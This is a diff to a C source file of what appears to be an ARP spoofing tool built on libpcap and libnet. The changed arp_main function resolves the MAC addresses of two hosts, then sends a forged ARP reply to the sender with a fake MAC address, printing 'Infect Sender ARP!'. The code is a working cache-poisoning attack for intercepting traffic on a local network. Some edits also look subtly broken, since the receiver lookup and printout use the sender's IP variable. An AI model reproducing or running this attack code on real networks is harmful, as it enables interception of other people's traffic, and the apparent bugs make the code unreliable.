@@ -8,14 +8,15 @@
 #include <string.h>
 #include "arp_spoof.h"
 
-void arp_main(u_char *s_mac, u_char *d_mac, u_char *r_mac,
-		struct in_addr s_ip, struct in_addr d_ip, pcap_t *handle)
+void arp_main(u_char *s_mac, u_char *d_mac, u_char *r_mac, u_char *f_mac,
+		struct in_addr s_ip, struct in_addr d_ip, struct in_addr r_ip)
 {
 	struct libnet_ethernet_hdr *eth_hdr;	//ethernet header
 	struct libnet_arp_hdr *arp_hdr;		//arp hedaer
 	struct pcap_pkthdr *header;		//packet header	
+	pcap_t *handle = NULL;
 	
-	int arp_size = 42;	//arp_packet size (ether + arp)
+	const int arp_size = 42;	//arp_packet size (ether + arp)
 	char errbuf[PCAP_ERRBUF_SIZE];
 	char dev[] = "eth0";
 	
@@ -27,8 +28,6 @@ void arp_main(u_char *s_mac, u_char *d_mac, u_char *r_mac,
 	
 	char buf[INET_ADDRSTRLEN];			//For d_ip address
 	int index = 0;
-
-	struct in_addr f_ip;
 
 	packet = (u_char *)malloc(arp_size);
 	
@@ -51,7 +50,7 @@ void arp_main(u_char *s_mac, u_char *d_mac, u_char *r_mac,
 	}
 
 	send_arp(packet, s_mac, d_mac, s_ip, d_ip, handle, header, 1);
-	
+
 	while(1)					//Check the packets!
 	{
 		index++;
@@ -66,33 +65,18 @@ void arp_main(u_char *s_mac, u_char *d_mac, u_char *r_mac,
 		}
 	}
 
-	printf("Sender MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
+	printf("\nSender MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
 		d_mac[0], d_mac[1], d_mac[2], d_mac[3], d_mac[4], d_mac[5]);
 	printf("Sender IP address: %s\n\n", inet_ntop(AF_INET, &d_ip, buf, sizeof(buf)));
-	
-	puts("Write Receiver IP address: ");
-	
-	while(1)
-	{
-		fgets(buf, sizeof(buf), stdin);
-		buf[strlen(buf) -1 ] = '\0';
 
-		if(inet_pton(AF_INET, buf, &f_ip.s_addr) == 0)
-		{
-			printf("Invalid IP address! \n");
-			continue;
-		}
-		else
-			break;
-	}
-	
-	send_arp(packet, s_mac, r_mac, s_ip, f_ip, handle, header, 1);	//Send arp to Receiver
-	
+	//Receiver Part
+	send_arp(packet, s_mac, r_mac, s_ip, r_ip, handle, header, 1);	//Send arp to Receiver
+
 	while(1)					//Check the packets!
 	{
 		index++;
 		pcap_next_ex(handle, &header, &reply);
-		if(get_arp(reply, s_mac, r_mac, f_ip) == 1)	
+		if(get_arp(reply, s_mac, r_mac, d_ip) == 1)	
 			break;
 
 		if(index > 50)				//If we check more than 50 packets
@@ -101,15 +85,14 @@ void arp_main(u_char *s_mac, u_char *d_mac, u_char *r_mac,
 			exit(1);
 		}
 	}
-	
+
 	printf("Receiver MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
 		r_mac[0], r_mac[1], r_mac[2], r_mac[3], r_mac[4], r_mac[5]);
-	printf("Receiver IP address: %s\n\n", inet_ntop(AF_INET, &f_ip, buf, sizeof(buf)));
+	printf("Receiver IP address: %s\n\n", inet_ntop(AF_INET, &d_ip, buf, sizeof(buf)));
 
-	send_arp(packet, s_mac, d_mac, f_ip, d_ip, handle, header, 2);	//Send fake ARP reply to sender
-	//send_arp(packet, s_mac, r_mac, d_ip, f_ip, handle, header, 2);	//Send fake ARP reply to receiver
-	
-	printf("\nSpoofing the packets....\n");
+	printf("Infect Sender ARP!\n");	
+	send_arp(packet, f_mac, d_mac, r_ip, d_ip, handle, header, 2);	//Send fake ARP reply to sender
+	//send_arp(packet, s_mac, r_mac, s_ip, r_ip, handle, header, 2);	//Send fake ARP reply to sender
 	
 	free(packet);
 	free(eth_hdr);
